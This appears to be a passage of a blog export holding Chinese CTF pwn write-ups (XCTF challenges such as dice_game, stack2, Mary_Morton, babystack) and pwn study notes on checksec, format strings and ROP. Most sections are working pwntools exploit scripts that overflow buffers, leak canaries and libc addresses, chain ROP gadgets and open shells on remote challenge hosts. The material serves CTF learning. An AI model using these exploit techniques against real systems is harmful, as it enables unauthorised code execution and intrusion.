<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background-image:url(img.jpg),url(img2.png);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>html</category>
        <category>css</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-pwn题</title>
    <url>/2019/08/15/pwn%E9%A2%98/</url>
    <content><![CDATA[<h1 id="xctf-pwn题"><a href="#xctf-pwn题" class="headerlink" title="xctf-pwn题"></a>xctf-pwn题</h1><h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><p>题目给了libc.so.6,先检查checksec<br><img src="https://i.loli.net/2019/08/18/iG2XZVW9o8LybvD.png" alt="UN_F_V8B~LMRPI__FPS9M0H.png"><br>放入IDA里面如下图<br><img src="https://i.loli.net/2019/08/18/SJbLfTYO2d18CwG.png" alt="Z1U@4A_JES_PF1_DZ~X__YG.png"><br>在buf中可知与随机数种子相差0x40，即可覆盖到seed<br>题目大概意思是执行50次随机数，成功后跳转到sub_B28函数<br><img src="https://i.loli.net/2019/08/18/V2SXTWYiPxbnKNU.png" alt="5JF6__OQTMVE`XDUT9NRIJX.png"><br>而此函数执行后便可得到shell</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"48157"</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"know your name: "</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x40</span> +p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#生成一个随机数数组</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	a.append(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#将随机数数组执行50次</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p><strong>seed(0)是可以预测的</strong><br>故可先生成随机数数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand(<span class="number">0</span>);<span class="comment">//利用种子0</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d,"</span>, rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/08/18/3s1gCApyMlcIF2e.png" alt="L_SHV0G8IEBZ9__IAPQTW_5.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"48157"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"know your name: "</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x40</span> +p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目里没给附件，盲打题，nc一波观察<br><img src="https://i.loli.net/2019/08/18/5bPUXNVh6AJYWe8.png" alt="VG0T`6WBD_ZF__SANA_`SS0.png"><br>猜测0x40060d为flag地址<br> <del>可以尝试0x40到无上限（到没耐心)</del></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">r.sendline(<span class="string">"A"</span>*<span class="number">0x48</span>+p64(<span class="number">0x40060d</span>)) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>从网上找了二进制文件链接：<a href="https://pan.baidu.com/s/1IKe3NpWAtrnWtstK1LUGbw" target="_blank" rel="noopener">https://pan.baidu.com/s/1IKe3NpWAtrnWtstK1LUGbw</a><br>提取码：9wgd </p>
<h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><p>按照惯例checksec<br><img src="https://i.loli.net/2019/08/20/mkxKAn8OMsXScQe.png" alt="_M7PO_HP@`_QEHSZ974QVNJ.png"><br>打开ida可得如下</p>
<p><img src="https://i.loli.net/2019/08/20/Jx1UzesbYoLIci8.png" alt="V~YR5~_CN_`N`0NR5S~Q_`C.png](https://i.loli.net/2019/08/20/On5MqZlrzaj1Cg9.png)
由图知%s占据0x2C-0xC=0x20
shift+f12查看字符串
![G7_XDNX_KRX9E`NTFLL___I.png"><br>可构造如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"111.198.29.45"</span>, <span class="number">53353</span>)</span><br><span class="line">flag_addr = <span class="number">0x080486CC</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"123"</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span> + p32(<span class="number">0</span>) + p32(flag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="stack-2"><a href="#stack-2" class="headerlink" title="stack 2"></a>stack 2</h2><p>此题先保存做法，日后好研究  ./13<br><img src="https://i.loli.net/2019/09/14/CMymRu8F4loEkTt.png" alt="_T8R_E@__~_F7K_P4R`GN_U.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span>   <span class="comment"># /bin/bash</span></span><br><span class="line">leave_offset=<span class="number">0x84</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'23233'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0X50</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,<span class="number">0x87</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"> </span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>官方解题</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">	sh = process(<span class="string">'./stack2'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">	gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	sh = remote(<span class="string">"47.96.239.28"</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	sh.send(<span class="string">"3\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	sh.send(str(off) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	sh.send(str(val) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_dword</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	write_byte(off, val &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">1</span>, (val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">2</span>, (val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">3</span>, (val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	sh.send(<span class="string">"5\n"</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line">write_dword(<span class="number">0x84</span>, <span class="number">0x8048450</span>)</span><br><span class="line">write_dword(<span class="number">0x8C</span>, <span class="number">0x8048980</span> + <span class="number">7</span>)</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>dir()查看引用函数<br>import os<br>os<br>os.system()<br>os.system(“sh”)</p>
<h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><p><img src="https://i.loli.net/2019/09/17/YeKgupGRbMk9hXc.png" alt="0F`L9WVXRKC4_VB2LCA2_GR.png"></p>
<p><img src="https://i.loli.net/2019/09/17/A4RuONZatJcor68.png" alt="1U`M_XS_OEB35_~FL_9PQYI.png"></p>
<p><img src="https://i.loli.net/2019/09/17/rI9Kw8ZXlqVsUgR.png" alt="K07KX_PSBBGI_4~Z_US__VH.png"></p>
<p><img src="https://i.loli.net/2019/09/17/hPFDVW2aIY6vRXm.png" alt="_IA8H1Z1_Q5A@G_7PVU5FX4.png"></p>
<p>在x64里 canary相对偏移=0x90-0x8<br>在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9<br>偏移为6+0x88/8=6+17=23</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span> </span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">"35317"</span>)</span><br><span class="line">bin1= <span class="number">0x4008da</span> </span><br><span class="line">p.sendlineafter(<span class="string">'3. Exit the battle \n'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">"%23$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>) </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(bin1)    </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><pre><code>官方wp给出的温馨提示：
①canary为防止泄露，第一位已知为&apos;\x00&apos;
②puts()函数输出时，遇到&apos;\x00&apos;才停止，即使字符串中存在&apos;\n&apos;,也会继续输出
③read函数在读取长度限制内，能够把&apos;\n&apos;也读进字符串中</code></pre><p><img src="https://i.loli.net/2019/09/20/G9gROMbBhEo187F.png" alt="QR~X93_O_RR@J7I8P__Y_VR.png"><br>使用命令ROPgadget –binary 18 –only “pop|ret”<br><img src="https://i.loli.net/2019/09/20/7yRMbGaHLEYVXvN.png" alt="U~8DHLLJX__D_N3J___1XTI.png"><br>使用命令one_gadget libc-2.23.so</p>
<p><img src="https://i.loli.net/2019/09/20/z5QlG16UJpbwrPa.png" alt="_OKL5FFEUJD_44N0_K8Q4PS.png"></p>
<p><img src="https://i.loli.net/2019/09/20/ZtyTvBQOXMhKfNm.png" alt="_BR`TR@__2KFVJT3EVGH_FM.png"><br><img src="https://i.loli.net/2019/09/20/5nKGE9mhAaH7UI6.png" alt="_12CNHGUZIT8T_488D~S__M.png"><br>v8-&gt;canary<br>puts()与read()溢出</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span> </span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">"45362"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./18"</span>)</span><br><span class="line">execve=<span class="number">0x45216</span></span><br><span class="line">main_a=<span class="number">0x400908</span></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))  <span class="comment">#canary = u64("\x00" + io.recv(7))</span></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_a)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"> </span><br><span class="line">execve_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>] - execve)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span> + p64(execve_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>记录官方wp，保存网址，日后研究<br>脚本分为获取canary；获得链接库地址偏移；获取shell三个部分，结构比较清晰。<br>先发送0x88长度的字符串+’\n’，read函数会读进0x89个字节，并将canary第一个字节覆盖，之后puts便能将canary泄露出来。<br>泄露链接库地址基址时，只需将canary的位置使用上一步中泄露出来的canary进行覆盖，获取链接库地址偏移和寄存器利用，详见<a href="http://www.cnblogs.com/ZHijack/p/7900736.html" target="_blank" rel="noopener">戳我</a>ret2libc尝试和<a href="http://www.cnblogs.com/ZHijack/p/7940686.html" target="_blank" rel="noopener">继续戳我</a>64位简单栈溢出。最后返回start函数，重新执行。<br>重新执行函数后，需重新泄露canary，然后进行溢出，即可获得shell。 此处的exeaddr不同于以往ROPgadget找到”/bin/sh”和system函数的地址，是用onegadget直接找到execve(“/bin/sh”, rsp+0x30, environ)的地址，所以只需跳转到此地址即可获得shell。</p>
<p>但one_gadget不能保证需要限制寄存器的值,不能保证每次都有效,本题使用one_gadget而不是比较保险的system(“/bin/sh”)是因为输入长度有限,只能构造很短的ropchain.</p>
<p>除此之外,如果one_gadget失效,还可以试一下另一种方法stack pivot(小本本记下来)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["deepin-terminal", "-x", "sh", "-c"]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    addr = int(raw_input(<span class="string">"DEBUG: "</span>), <span class="number">16</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + str(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    io = process(<span class="string">"./babystack"</span>)</span><br><span class="line">    elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    exe_addr = <span class="number">0x3f2d6</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"1c6a6fb.isec.anscen.cn"</span>, <span class="number">1234</span>)</span><br><span class="line">    elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">    exe_addr = <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCanary</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    payload = cyclic(<span class="number">0x88</span>)</span><br><span class="line">    <span class="comment">#  debug()</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    canary = u64(<span class="string">"\x00"</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">    <span class="comment">#  print hex(canary)</span></span><br><span class="line">    log.debug(<span class="string">"leaked canary -&gt; 0x%x"</span> % canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBase</span><span class="params">(canary)</span>:</span></span><br><span class="line">    read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">    read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">    <span class="comment">#  start_plt = elf.symbols["start"]</span></span><br><span class="line">    <span class="comment">#  start_plt = 0x400720</span></span><br><span class="line">    start_plt = <span class="number">0x400908</span></span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">    pop_rsi_r15_ret = <span class="number">0x0000000000400a91</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    <span class="comment">#  log.info("------------------")</span></span><br><span class="line">    payload = cyclic(<span class="number">0x88</span>) + p64(canary) * <span class="number">2</span> + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start_plt)</span><br><span class="line">    <span class="comment">#  print len(payload)</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="comment">#  debug()</span></span><br><span class="line">    <span class="comment">#  log.info("------------------")</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    read_leaked = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    log.debug(<span class="string">"read_leaked -&gt; 0x%x"</span> % read_leaked)</span><br><span class="line">    read_libc = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">    libc_base = read_leaked - read_libc</span><br><span class="line">    log.debug(<span class="string">"leaked libcBase -&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span><span class="params">(canary, libcBase)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    exeAddr = libcBase + exe_addr</span><br><span class="line">    payload = cyclic(<span class="number">0x88</span>) + p64(canary) * <span class="number">2</span> + p64(exeAddr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment">#  debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    canary = getCanary()</span><br><span class="line">    libcBase = getBase(canary)</span><br><span class="line">    canary = getCanary()</span><br><span class="line">    getShell(canary, libcBase)</span><br></pre></td></tr></table></figure>

<p><del>持续更新</del></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn笔记</title>
    <url>/2019/08/15/pwn/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://i.loli.net/2019/08/14/BIDV8X76iuTlbGe.png" alt="checksec.png"></p>
<ul>
<li>RELRO<br>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。<strong>说明我们对GOT表具有写权限.</strong></li>
<li>Canary<br> <strong>不能直接使用栈溢出</strong></li>
<li>NX<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br> <strong>不能在堆栈上执行shellcode</strong></li>
<li>PIE<br> <strong>地址空间分布随机化</strong></li>
</ul>
<h2 id="常用基本的格式化字符串参数介绍"><a href="#常用基本的格式化字符串参数介绍" class="headerlink" title="常用基本的格式化字符串参数介绍"></a>常用基本的格式化字符串参数介绍</h2><table>
<thead>
<tr>
<th align="center">字符</th>
<th>功能</th>
<th>详解</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%c</td>
<td>输出字符</td>
<td>配上%n可用于向指定地址写数据</td>
</tr>
<tr>
<td align="center">%d</td>
<td>输出十进制整数</td>
<td>配上%n可用于向指定地址写数据</td>
</tr>
<tr>
<td align="center">%x</td>
<td>输出16进制数据</td>
<td>如%i$x表示要泄漏偏移i处4字节长的16进制数据</td>
</tr>
<tr>
<td align="center">%p</td>
<td>输出16进制数据</td>
<td>附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节</td>
</tr>
<tr>
<td align="center">%s</td>
<td>输出的内容是字符串</td>
<td>即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串</td>
</tr>
<tr>
<td align="center">%n</td>
<td>将已经打印的字符个数赋值给偏移处指针所指向的地址位置</td>
<td>如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节</td>
</tr>
</tbody></table>
<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>将EIP劫持到某个函数的PLT表项中我们可以直接调用该函数</p>
<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="有system有bin-sh"><a href="#有system有bin-sh" class="headerlink" title="有system有bin/sh"></a>有system有bin/sh</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line">system1 = <span class="number">0x08048320</span></span><br><span class="line">bin1 = <span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x8c</span>+ p32(system1) + p32(<span class="number">0</span>)+ p32(bin1)</span><br><span class="line"><span class="comment">#填充值/返回函数/函数结束地址/指向”/bin/sh“</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="有system无bin-sh"><a href="#有system无bin-sh" class="headerlink" title="有system无bin/sh"></a>有system无bin/sh</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./名称'</span>)</span><br><span class="line">scanf_add = p32(elf.symbols[<span class="string">'__isoc99_scanf'</span>])</span><br><span class="line">format_s = p32(<span class="number">0x08045201</span>)</span><br><span class="line"><span class="comment">#%s地址</span></span><br><span class="line">binsh_add = p32(<span class="number">0x0804a030</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'A'</span>*<span class="number">0x34</span> + scanf_add + main_add + format_s + binsh_add</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span 